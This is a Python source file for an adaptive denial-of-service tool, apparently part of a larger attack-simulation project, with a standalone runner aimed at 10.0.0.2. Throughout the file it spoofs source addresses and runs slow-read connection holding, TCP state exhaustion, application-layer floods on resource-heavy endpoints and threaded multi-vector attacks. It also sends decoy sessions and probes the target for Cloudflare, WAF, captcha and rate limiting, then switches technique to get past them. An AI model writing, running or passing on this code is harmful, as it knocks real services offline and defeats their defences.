import random
import time
import threading
import ipaddress
import socket
import requests
from scapy.all import IP, TCP, ICMP, UDP, Raw, send, sr1, RandShort
import psutil
from scapy.layers.http import HTTPRequest
import ssl
import re
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger('adversarial_ddos')

# ---- IP Address Management ----

class IPRotator:
    def __init__(self, subnet="192.168.0.0/16"):
        self.subnet = ipaddress.IPv4Network(subnet)
        self.used_ips = set()
        self.lock = threading.Lock()
    
    def get_random_ip(self):
        with self.lock:
            # Get a random IP from subnet that hasn't been used recently
            while True:
                random_ip = str(random.choice(list(self.subnet.hosts())))
                if random_ip not in self.used_ips:
                    self.used_ips.add(random_ip)
                    # Keep track of last 1000 IPs to avoid reuse
                    if len(self.used_ips) > 1000:
                        self.used_ips.pop()
                    return random_ip

# ---- Advanced Protocol Manipulation ----

class PacketCrafter:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
        ]
        
        self.http_methods = ["GET", "POST", "HEAD", "OPTIONS"]
        self.http_paths = ["/", "/index.html", "/api/v1/users", "/products", 
                          "/login", "/static/css/main.css", "/images/banner.jpg"]
        
        # Common HTTP headers
        self.common_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }
    
    def craft_tcp_packet(self, src, dst, dport=80):
        seq = random.randint(1000, 9000000)
        sport = random.randint(1024, 65535)
        
        # Randomize TCP options and flags more intelligently
        flags = random.choice(["S", "SA", "A", "PA", "FA"])
        window = random.randint(8192, 65535)
        
        # Create packet with randomized TTL
        ttl = random.randint(48, 128)
        packet = IP(src=src, dst=dst, ttl=ttl)/TCP(sport=sport, dport=dport, 
                                                   seq=seq, window=window, flags=flags)
        return packet
    
    def craft_http_packet(self, src, dst, dport=80):
        # Create base TCP packet
        base_packet = self.craft_tcp_packet(src, dst, dport)
        
        # Choose random HTTP method and path
        method = random.choice(self.http_methods)
        path = random.choice(self.http_paths)
        user_agent = random.choice(self.user_agents)
        
        # Create HTTP headers
        headers = dict(self.common_headers)
        headers["User-Agent"] = user_agent
        headers["Host"] = dst
        
        # Add a random referer sometimes
        if random.random() > 0.7:
            headers["Referer"] = f"https://{random.choice(['google.com', 'facebook.com', 'twitter.com'])}/search?q=products"
        
        # Format HTTP request
        http_request = f"{method} {path} HTTP/1.1\r\n"
        for header, value in headers.items():
            http_request += f"{header}: {value}\r\n"
        http_request += "\r\n"
        
        # Add body for POST requests
        if method == "POST":
            body = "param1=value1&param2=value2"
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["Content-Length"] = str(len(body))
            http_request += body
        
        # Combine with payload
        packet = base_packet/Raw(load=http_request.encode())
        return packet

# ---- Advanced Attack Techniques ----

class AdvancedTechniques:
    def __init__(self, ip_rotator):
        self.ip_rotator = ip_rotator
        self.packet_crafter = PacketCrafter()
        self.target_info = {}
        self.session_tokens = {}
    
    def slow_read_attack(self, dst, num_connections=50, duration=30):
        """
        Slowloris-type attack that establishes many connections but reads responses very slowly
        """
        logger.info(f"Starting slow read attack against {dst} with {num_connections} connections")
        connections = []
        
        try:
            # Establish multiple connections
            for _ in range(num_connections):
                src = self.ip_rotator.get_random_ip()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((dst, 80))
                
                # Send a valid HTTP request
                request = f"GET / HTTP/1.1\r\nHost: {dst}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
                s.send(request.encode())
                
                # Add to our list of connections
                connections.append(s)
                
                # Small delay between connection establishments
                time.sleep(random.uniform(0.1, 0.3))
            
            # Keep connections open by reading very slowly
            end_time = time.time() + duration
            while time.time() < end_time:
                for s in connections:
                    try:
                        # Read just 1 byte at a time, very slowly
                        s.recv(1)
                        time.sleep(random.uniform(1, 5))
                    except socket.timeout:
                        # Socket timed out, which is fine
                        pass
                    except:
                        # If connection closed, try to reestablish
                        try:
                            s.close()
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(2)
                            s.connect((dst, 80))
                            request = f"GET / HTTP/1.1\r\nHost: {dst}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
                            s.send(request.encode())
                        except:
                            pass
        finally:
            # Close all connections
            for s in connections:
                try:
                    s.close()
                except:
                    pass
    
    def tcp_state_exhaustion(self, dst, dport=80, num_packets=1000):
        """
        Advanced TCP state exhaustion attack that manipulates sequence numbers
        and window sizes to keep connections half-open but valid
        """
        logger.info(f"Starting TCP state exhaustion attack against {dst}:{dport}")
        
        # Track sequence numbers for more sophisticated sequence prediction
        seq_base = random.randint(1000000, 9000000)
        
        for i in range(num_packets):
            src = self.ip_rotator.get_random_ip()
            sport = random.randint(1024, 65535)
            seq = seq_base + (i * 1024)
            
            # Sophisticated manipulation of TCP window size
            window = random.randint(16384, 65535)
            
            # Send SYN packet to initiate connection
            syn_packet = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, 
                                                 flags="S", seq=seq, window=window)
            
            # Send and wait for SYN-ACK
            try:
                reply = sr1(syn_packet, timeout=1, verbose=0)
                
                if reply and reply.haslayer(TCP) and reply.getlayer(TCP).flags & 0x12:  # SYN+ACK
                    # Extract server sequence number and acknowledge it
                    server_seq = reply.getlayer(TCP).seq
                    ack_packet = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport,
                                                         flags="A", seq=seq+1, 
                                                         ack=server_seq+1, window=window)
                    send(ack_packet, verbose=0)
                    
                    # After establishing connection, don't continue with data transfer
                    # This keeps connection half-open, consuming resources on target
                    logger.debug(f"Established half-open connection from {src}:{sport}")
            except:
                pass
            
            # Add jitter to avoid detection based on timing patterns
            time.sleep(random.uniform(0.01, 0.1))
    
    def distributed_application_layer_attack(self, dst, dport=80, num_requests=100):
        """
        Advanced application layer attack that mimics legitimate HTTP traffic
        but targets resource-intensive endpoints
        """
        logger.info(f"Starting distributed application layer attack against {dst}:{dport}")
        
        # Resource-intensive endpoints that might cause server strain
        resource_heavy_paths = [
            "/search?q=" + "a" * random.randint(50, 100),
            "/api/products?page=1&size=100&sort=price",
            "/api/users/verify?token=" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=64)),
            "/download?file=large_report.pdf",
            "/images/highres_" + str(random.randint(1000, 9999)) + ".jpg"
        ]
        
        for _ in range(num_requests):
            src = self.ip_rotator.get_random_ip()
            
            # Create base TCP connection
            base_packet = self.packet_crafter.craft_tcp_packet(src, dst, dport)
            
            # Select a resource-heavy path
            path = random.choice(resource_heavy_paths)
            
            # Create HTTP request targeting resource-heavy endpoint
            user_agent = random.choice(self.packet_crafter.user_agents)
            headers = dict(self.packet_crafter.common_headers)
            headers["User-Agent"] = user_agent
            headers["Host"] = dst
            
            # Format HTTP request
            http_request = f"GET {path} HTTP/1.1\r\n"
            for header, value in headers.items():
                http_request += f"{header}: {value}\r\n"
            
            # Sometimes add cookies to appear more legitimate
            if random.random() > 0.5:
                http_request += f"Cookie: session_id={random.randbytes(16).hex()}; user_pref=dark_mode\r\n"
                
            http_request += "\r\n"
            
            # Send packet
            packet = base_packet/Raw(load=http_request.encode())
            send(packet, verbose=0)
            
            # Variable timing to avoid detection
            time.sleep(random.uniform(0.05, 0.2))
    
    def multi_vector_attack(self, dst, duration=60):
        """
        Launch multiple attack vectors simultaneously to make detection harder
        """
        logger.info(f"Starting multi-vector attack against {dst} for {duration} seconds")
        
        end_time = time.time() + duration
        
        # Create threads for different attack vectors
        threads = []
        
        # TCP State Exhaustion
        t1 = threading.Thread(target=self._timed_tcp_exhaustion, args=(dst, end_time))
        threads.append(t1)
        
        # Application Layer Attack
        t2 = threading.Thread(target=self._timed_app_layer, args=(dst, end_time))
        threads.append(t2)
        
        # Slow Read Attack - more resource intensive
        t3 = threading.Thread(target=self.slow_read_attack, args=(dst, 20, duration))
        threads.append(t3)
        
        # Start all threads
        for t in threads:
            t.start()
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
            
    def _timed_tcp_exhaustion(self, dst, end_time):
        while time.time() < end_time:
            self.tcp_state_exhaustion(dst, num_packets=50)
            time.sleep(1)
    
    def _timed_app_layer(self, dst, end_time):
        while time.time() < end_time:
            self.distributed_application_layer_attack(dst, num_requests=20)
            time.sleep(1)

# ---- Advanced Session Management ----

class SessionMaintainer:
    """Maintains persistent sessions to appear legitimate"""
    
    def __init__(self, ip_rotator):
        self.ip_rotator = ip_rotator
        self.sessions = {}  # Store session info for different targets
        self.lock = threading.Lock()
    
    def create_session(self, target):
        """Create and maintain a legitimate looking session"""
        src_ip = self.ip_rotator.get_random_ip()
        
        try:
            # Create an actual HTTP session
            session = requests.Session()
            session.headers.update({
                'User-Agent': random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
                ]),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                'Accept-Language': 'en-US,en;q=0.5'
            })
            
            # Make initial request to get cookies/session info
            response = session.get(f"http://{target}/", timeout=2)
            
            # Store the session info
            with self.lock:
                self.sessions[src_ip] = {
                    'session': session,
                    'cookies': session.cookies,
                    'last_page': '/',
                    'created': time.time()
                }
                
            logger.debug(f"Created legitimate session from {src_ip}")
            return src_ip
        except Exception as e:
            logger.debug(f"Failed to create session: {e}")
            return None
    
    def maintain_sessions(self, target, session_count=10, duration=300):
        """Create and maintain multiple legitimate-looking sessions"""
        logger.info(f"Maintaining {session_count} legitimate sessions with {target}")
        
        # Create initial sessions
        active_sessions = []
        for _ in range(session_count):
            session_ip = self.create_session(target)
            if session_ip:
                active_sessions.append(session_ip)
            time.sleep(random.uniform(1, 3))
        
        # Maintain sessions for duration
        end_time = time.time() + duration
        while time.time() < end_time:
            # Randomly select a session to interact with
            if active_sessions:
                session_ip = random.choice(active_sessions)
                session_info = self.sessions.get(session_ip)
                
                if session_info:
                    try:
                        # Make a legitimate-looking request
                        session = session_info['session']
                        
                        # Choose a page to visit based on previous page
                        if session_info['last_page'] == '/':
                            next_page = random.choice(['/about', '/products', '/contact'])
                        elif session_info['last_page'] == '/products':
                            next_page = f'/product/{random.randint(1, 100)}'
                        else:
                            next_page = '/'
                            
                        # Make the request
                        response = session.get(f"http://{target}{next_page}", timeout=2)
                        
                        # Update session info
                        with self.lock:
                            session_info['last_page'] = next_page
                            session_info['last_activity'] = time.time()
                        
                        logger.debug(f"Session {session_ip} visited {next_page}")
                    except Exception as e:
                        # Handle failed request - might need to create new session
                        logger.debug(f"Session interaction failed: {e}")
                        active_sessions.remove(session_ip)
                        new_ip = self.create_session(target)
                        if new_ip:
                            active_sessions.append(new_ip)
            
            # Sleep between interactions
            time.sleep(random.uniform(5, 15))
        
        # Clean up sessions
        logger.info("Cleaning up sessions")
        for ip in active_sessions:
            if ip in self.sessions:
                with self.lock:
                    del self.sessions[ip]

# ---- Monitoring and Adaptation ----

class AdaptiveController:
    def __init__(self, target):
        self.target = target
        self.response_times = []
        self.detected_countermeasures = set()
        self.lock = threading.Lock()
    
    def probe_target(self):
        """Send probe requests to measure target response and detect countermeasures"""
        try:
            start_time = time.time()
            response = requests.get(f"http://{self.target}/", timeout=5)
            response_time = time.time() - start_time
            
            with self.lock:
                # Keep last 10 response times
                self.response_times.append(response_time)
                if len(self.response_times) > 10:
                    self.response_times.pop(0)
                
                # Check for countermeasures in headers or response
                if response.status_code == 503:
                    self.detected_countermeasures.add("rate_limiting")
                
                if "cf-ray" in response.headers:
                    self.detected_countermeasures.add("cloudflare")
                
                if "captcha" in response.text.lower():
                    self.detected_countermeasures.add("captcha")
                
                if response.status_code == 403:
                    self.detected_countermeasures.add("waf_blocking")
            
            return response_time
        except requests.exceptions.Timeout:
            with self.lock:
                self.detected_countermeasures.add("timeout_defense")
            return None
        except Exception as e:
            logger.debug(f"Probe error: {e}")
            return None
    
    def get_average_response_time(self):
        with self.lock:
            if not self.response_times:
                return 1.0  # Default if no measurements
            return sum(self.response_times) / len(self.response_times)
    
    def get_recommended_attack_params(self):
        """Recommend attack parameters based on target behavior"""
        with self.lock:
            avg_response = self.get_average_response_time()
            countermeasures = list(self.detected_countermeasures)
        
        # Default parameters
        params = {
            "packet_rate": 10,
            "connection_count": 50,
            "preferred_technique": "multi_vector",
            "rotation_speed": "medium"
        }
        
        # Adjust based on response time
        if avg_response < 0.2:  # Very fast target
            params["packet_rate"] = 20
            params["connection_count"] = 100
        elif avg_response > 2.0:  # Already struggling target
            params["packet_rate"] = 5
            params["connection_count"] = 20
        
        # Adjust based on detected countermeasures
        if "rate_limiting" in countermeasures:
            params["preferred_technique"] = "slow_read"
            params["rotation_speed"] = "fast"
        
        if "waf_blocking" in countermeasures:
            params["preferred_technique"] = "tcp_state_exhaustion"
        
        if "cloudflare" in countermeasures:
            params["rotation_speed"] = "very_fast"
        
        return params
    
    def monitoring_loop(self, duration=300):
        """Continuously monitor target and update parameters"""
        logger.info(f"Starting adaptive monitoring of {self.target} for {duration} seconds")
        
        end_time = time.time() + duration
        while time.time() < end_time:
            self.probe_target()
            
            # Log current status
            avg_time = self.get_average_response_time()
            countermeasures = list(self.detected_countermeasures)
            logger.info(f"Target status: avg_response={avg_time:.2f}s, detected={countermeasures}")
            
            # Wait before next probe
            time.sleep(10)

# ---- Main Attack Coordinator ----

class AdvancedDDoSCoordinator:
    def __init__(self, target):
        self.target = target
        self.ip_rotator = IPRotator("192.168.0.0/16")
        self.advanced = AdvancedTechniques(self.ip_rotator)
        self.session_maintainer = SessionMaintainer(self.ip_rotator)
        self.adaptive_controller = AdaptiveController(target)
    
    def execute_advanced_attack(self, duration=300):
        """Execute a comprehensive advanced DDoS attack"""
        logger.info(f"Starting advanced DDoS against {self.target} for {duration} seconds")
        
        # Start monitoring in separate thread
        monitor_thread = threading.Thread(
            target=self.adaptive_controller.monitoring_loop,
            args=(duration,)
        )
        monitor_thread.start()
        
        # Start legitimate-looking session activity
        session_thread = threading.Thread(
            target=self.session_maintainer.maintain_sessions,
            args=(self.target, 5, duration)
        )
        session_thread.start()
        
        # Main attack loop
        end_time = time.time() + duration
        while time.time() < end_time:
            # Get recommended parameters based on target state
            params = self.adaptive_controller.get_recommended_attack_params()
            
            # Choose attack technique based on recommendations
            technique = params["preferred_technique"]
            
            if technique == "multi_vector":
                # Execute for a shorter interval to allow for adaptation
                self.advanced.multi_vector_attack(self.target, min(30, end_time - time.time()))
            elif technique == "slow_read":
                self.advanced.slow_read_attack(
                    self.target, 
                    num_connections=params["connection_count"],
                    duration=min(30, end_time - time.time())
                )
            elif technique == "tcp_state_exhaustion":
                for _ in range(10):  # Run multiple rounds
                    if time.time() >= end_time:
                        break
                    self.advanced.tcp_state_exhaustion(
                        self.target, 
                        num_packets=params["packet_rate"] * 10
                    )
                    time.sleep(1)
                    
            # Short pause to check status
            time.sleep(5)
        
        # Wait for monitoring to complete
        monitor_thread.join()
        session_thread.join()
        
        logger.info("Advanced DDoS attack completed")

# ---- Run everything ----

def run_attack(attacker_host, victim_ip, duration, attack_variant="multi_vector"):
    """
    Main function to run a specific advanced adversarial attack.
    attacker_host is not directly used here as IP rotation is handled internally.
    """
    logger.info(f"Starting advanced adversarial attack '{attack_variant}' against {victim_ip} for {duration} seconds.")
    coordinator = AdvancedDDoSCoordinator(victim_ip)

    if attack_variant == "slow_read":
        coordinator.advanced.slow_read_attack(victim_ip, duration=duration)
    elif attack_variant == "tcp_state_exhaustion":
        # For state exhaustion, we might run it in a loop for the duration
        end_time = time.time() + duration
        while time.time() < end_time:
            coordinator.advanced.tcp_state_exhaustion(victim_ip, num_packets=100)
            time.sleep(1) # Small delay
    elif attack_variant == "application_layer":
        end_time = time.time() + duration
        while time.time() < end_time:
            coordinator.advanced.distributed_application_layer_attack(victim_ip, num_requests=50)
            time.sleep(1) # Small delay
    elif attack_variant == "multi_vector":
        coordinator.advanced.multi_vector_attack(victim_ip, duration=duration)
    else:
        logger.warning(f"Unknown attack variant: {attack_variant}. Running multi_vector by default.")
        coordinator.advanced.multi_vector_attack(victim_ip, duration=duration)
    
    logger.info(f"Advanced adversarial attack '{attack_variant}' completed.")

if __name__ == "__main__":
    # Example usage for standalone testing
    # You would typically call run_attack from main.py
    # For testing, let's assume a victim IP and a duration
    test_victim_ip = "10.0.0.2"
    test_duration = 60 # seconds
    
    # Example: Run a multi-vector attack
    run_attack(None, test_victim_ip, test_duration, "multi_vector")
    
    # Example: Run a slow_read attack
    # run_attack(None, test_victim_ip, test_duration, "slow_read")
    
    # Example: Run a tcp_state_exhaustion attack
    # run_attack(None, test_victim_ip, test_duration, "tcp_state_exhaustion")
    
    # Example: Run an application_layer attack
    # run_attack(None, test_victim_ip, test_duration, "application_layer")
